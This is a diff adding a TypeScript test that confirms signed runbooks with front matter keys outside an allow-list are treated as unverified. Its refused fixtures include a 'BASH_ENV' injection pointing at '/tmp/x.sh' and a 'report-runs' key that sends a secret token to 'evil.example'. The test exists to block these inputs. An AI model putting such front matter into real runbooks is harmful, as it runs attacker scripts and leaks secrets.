@@ -12,6 +12,7 @@ import {
   runbookDigest,
 } from '@md-runbook/core/runbookLink';
 import { buildManifest, formatManifest, withSignature } from '@md-runbook/core/signing';
+import { v1FrontMatterProblems } from '@md-runbook/core/frontMatterRun';
 
 const manifestOf = (text: string): string => {
   const r = buildManifest(text, { name: 'ops/restart', version: 1, scopes: ['web'], patterns: { SERVICE: '[a-z]+' } });
@@ -131,6 +132,28 @@ describe('runbook links', () => {
     }
     // Front matter that runs nothing differently (a title) is fine.
     assert.equal(linkTrust(link, `---\ntitle: Restart\n---\n\n${signed}`), 'signed');
+  });
+
+  it('a version 1 signature: only front matter keys on the allow-list, whatever the line ends (security review, round 4)', () => {
+    const r = buildManifest(RUNBOOK, { name: 'ops/restart', version: 1, scopes: [], patterns: { SERVICE: '[a-z]+' } }, { version: 1 });
+    if ('errors' in r) throw new Error(r.errors.join('; '));
+    const signed = withSignature(RUNBOOK, { signer: 'ops@example.net', signed: '2026-11-16', manifest: formatManifest(r.manifest), signature: 'U1NIU0lHAAAAAQ' + 'A'.repeat(150) });
+    const link = { url: 'https://a/b.md', params: {} };
+    const refused: [string, string[]][] = [
+      ['---\renv:\r  BASH_ENV: /tmp/x.sh\r---\r', ['env:']],
+      ['---\nmanual-steps: continue\npractice: prod-db-1\ngit-bash-path-conversion: off\nreport-runs: https://evil.example/collect\nreport-runs-token: ${secret:T}\n---\n', ['manual-steps:', 'practice:', 'git-bash-path-conversion:', 'report-runs:', 'report-runs-token:']],
+      ['---\nparams:\n  - SERVICE: api\n---\n', ['params: (defaults or choices)']],
+      ['---\nparams:\n  - SERVICE # One of: api, web\n---\n', ['params: (defaults or choices)']],
+      ['---\nENV:\n  X: 1\nfuture-key: on\n---\n', ['env:', 'future-key:']],
+      ['---\n<!-- md-runbook:note -->\n---\n', ['a line that is no key']],
+    ];
+    for (const [fm, keys] of refused) {
+      assert.deepEqual(v1FrontMatterProblems(fm + signed), keys, JSON.stringify(fm));
+      assert.equal(linkTrust(link, fm + signed), 'unverified', JSON.stringify(fm));
+    }
+    const fine = '---\r\ntitle: Restart\r\ndescription: The API\r\nincident: INC-1\r\nseverity: SEV2\r\nevidence: true\r\ndrill: true\r\nrto: 30m\r\nprose: off\r\nparams:\r\n  - SERVICE # the service\r\n---\r\n';
+    assert.deepEqual(v1FrontMatterProblems(fine + signed), []);
+    assert.equal(linkTrust(link, fine + signed), 'signed');
   });
 
   it('a whole-runbook signature (version 2) no longer counts once the text around the blocks changed', () => {
